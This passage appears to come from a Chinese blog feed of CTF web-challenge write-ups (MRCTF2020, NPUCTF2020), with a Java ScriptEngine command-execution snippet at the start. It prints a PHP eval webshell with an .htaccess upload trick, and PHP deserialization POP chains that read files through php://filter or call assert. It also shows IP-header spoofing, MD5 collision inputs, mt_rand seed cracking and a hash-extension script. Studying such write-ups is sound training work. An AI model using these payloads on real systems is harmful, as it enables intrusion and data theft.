<li>class.forName用于反射类，指定类名即可</li>
<li>class.getDeclaredMethod 用于映射类中的方法</li>
<li>invoke ，开始调用该方法， 传入参数即可使用</li>
</ul>
<h2 id="4-javax-script-ScriptEngineMana"><a href="#4-javax-script-ScriptEngineMana" class="headerlink" title="4. javax.script.ScriptEngineMana"></a>4. javax.script.ScriptEngineMana</h2><p>本质上还是使用上面的三种方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> ScriptException </span>&#123;</span><br><span class="line">    Object scriptEngineManager = <span class="keyword">new</span> ScriptEngineManager().getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br><span class="line">    System.out.println(scriptEngineManager);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我比较惊讶，为什么输出语句也可以执行命令呢？</p>
]]></content>
  </entry>
  <entry>
    <title>MRCTF2020</title>
    <url>/2020/10/29/MRCTF2020/</url>
    <content><![CDATA[<p>怎么说呢。。是新手题目，又不太像，有些题目脑洞有点大</p>
<h1 id="1-套娃"><a href="#1-套娃" class="headerlink" title="1.套娃"></a>1.套娃</h1><p>读源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中可以看见过滤_和%5f，那我们编码绕过就无办法了啊，但是找到参考文献：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;213359.html</span><br></pre></td></tr></table></figure>

<p>其中对这种的绕过</p>
<p><img src="image-20201029175514743.png" alt="image-20201029175514743"></p>
<p>于是我们构造空格来绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>

<p>之后在secrettw.php中，JSfcuk翻译即可得到让传值读取源码：</p>
<p><img src="image-20201029175921389.png" alt="image-20201029175921389"></p>
<p>读取到源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>其中对IP进行了一次check，XFF不可用，用Clinet-IP即可绕过</p>
<p><img src="image-20201029180308506.png" alt="image-20201029180308506"></p>
<p>之后看上面的简单函数的逆向，把加号改成减号就行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$v = <span class="string">&quot;fj]a&amp;f\b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $v = base64_decode($v);</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (change(<span class="string">&quot;ZmpdYSZmXGI=&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>比较恶心到人的是2333的输出，我之前无论如何输入都不行，一度怀疑人生，最后找到data的伪协议可以绕过，参考文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;nzjdsds&#x2F;article&#x2F;details&#x2F;82461043</span><br></pre></td></tr></table></figure>

<p>最后成功拿到flag，flag在源码中：</p>
<p><img src="image-20201029180627670.png" alt="image-20201029180627670"></p>
<h1 id="2-你传你🐎呢"><a href="#2-你传你🐎呢" class="headerlink" title="2.你传你🐎呢"></a>2.你传你🐎呢</h1><p>分别上传.htaccess和一句话即可：</p>
<p><img src="image-20201029182056361.png" alt="image-20201029182056361"></p>
<p>一句话用asp的格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="image-20201029182147837.png" alt="image-20201029182147837"></p>
<p>之后用蚁剑🔗拿flag即可，这道题我比较奇怪的就是过滤了很多东西，但是又没啥用,我猜测是出题人过滤不够？不然可以用disable_function的来做的,过滤如下：k’h’j</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld	</span><br></pre></td></tr></table></figure>

<h1 id="3-Ez-bypass"><a href="#3-Ez-bypass" class="headerlink" title="3.Ez_bypass"></a>3.Ez_bypass</h1><p>MD5强等于绕过和弱等于绕过：</p>
<p><img src="image-20201029190823452.png" alt="image-20201029190823452"></p>
<p>当然也可以用下面这两组数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二步；</p>
<p><img src="image-20201029190903989.png" alt="image-20201029190903989"></p>
<h1 id="4-PYWebsite"><a href="#4-PYWebsite" class="headerlink" title="4.PYWebsite"></a>4.PYWebsite</h1><p><img src="image-20201029190958345.png" alt="image-20201029190958345"></p>
<p>看到这句话，直接伪造XFF即可</p>
<p><img src="image-20201029191040967.png" alt="image-20201029191040967"></p>
<h1 id="5-Ezpop"><a href="#5-Ezpop" class="headerlink" title="5.Ezpop"></a>5.Ezpop</h1><p>首先审计源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>我自己审计的时候感觉有点懵，首先我们可能要用到的是include这么一个函数，而var函数会在__invoke的时候去调用$var，进行文件包含，于是我们构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>接着就是去找哪里可以调用到这么一个__invoke方法了，根据PHP的手册，我们会在 函数被当成方法调用的时候自动调用，例子如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$mod();</span><br><span class="line"><span class="comment">//在下面则会自动调用invoke方法</span></span><br></pre></td></tr></table></figure>



<p>往下看就能看见Test方法，因为它返回了一个function。所以让Test去get 一下Modifier类，就会先调用__get方法，结果因为被当成了函数进行调用，我们的Modifier类自动的调用了invoke方法。</p>
<p>然后我卡在这里好久..最后看了师傅们的博客才想到该怎么写..说实话还是有点懵逼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在show函数当中，我们需要找到__wakeup函数，因为它进行了echo操作，此时便会触发string函数</p>
<p>修改source的值。</p>
<p>最后要注意protected属性修饰的变量应该用urlencode进行修饰避免不可见字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"><span class="comment">//    private $c;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$show1 = <span class="keyword">new</span> Show();</span><br><span class="line">$show1 -&gt;str =$test;</span><br><span class="line">$show1-&gt;str-&gt;p = $mod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$show2 = <span class="keyword">new</span> Show($show1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($show2));</span><br><span class="line"><span class="comment">//当我们触发</span></span><br></pre></td></tr></table></figure>



<p>这里就是进行了一个套娃，当反序列化的时候呢，show方法被反序列化，调用了wakeup的函数，之后又因为</p>
<p>__construct,进行了一句输出，所以就造成了toString调用，在此之前我们构造好语句即可</p>
<p>$show2 纯粹的是进行一次wakeup调用！</p>
<p><img src="image-20201029191526057.png" alt="image-20201029191526057"></p>
<h1 id="6-Ezadult"><a href="#6-Ezadult" class="headerlink" title="6.Ezadult"></a>6.Ezadult</h1><p>页面啥也看不出来，直接<a href="http://www.zip下了一波代码，之后发现是伪随机数爆破，构造两个脚本：">www.zip下了一波代码，之后发现是伪随机数爆破，构造两个脚本：</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#结果 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下载php_mt_rand那个脚本，使用教程：</p>
<p>记得用make编译c语言的东西，之后./运行即可：</p>
<p><img src="image-20201029203700811.png" alt="image-20201029203700811"></p>
<p>跑出公钥来：1775196155</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">//公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后密码用万能密码一过，即可得到flag</p>
<p>后面的两个一个太难一个是题目down掉了完全用不了。。</p>
]]></content>
  </entry>
  <entry>
    <title>NPUCTF2020</title>
    <url>/2020/10/30/NPUCTF2020/</url>
    <content><![CDATA[<h1 id="web🐕"><a href="#web🐕" class="headerlink" title="web🐕"></a>web🐕</h1><p>列表内容复制粘贴，丢python里面跑一轮就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>啊，别看了，这上面太丢人了。。。原来是因为这是最后一步，</p>
<h1 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h1><p>这道题目和之前在网鼎杯做的phpweb很像，一样的是进行动调：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>flag说是在phpinfo当中,构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<h1 id="Ezinclude"><a href="#Ezinclude" class="headerlink" title="Ezinclude"></a>Ezinclude</h1><p><img src="image-20201030092624788.png" alt="image-20201030092624788"></p>
<p>第一步，这里说是cookies里面有一个hash，是hash拓展攻击：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ha1cyon-ctf.fun:30004/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;</span>,<span class="string">&#x27;123444&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username/password error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> 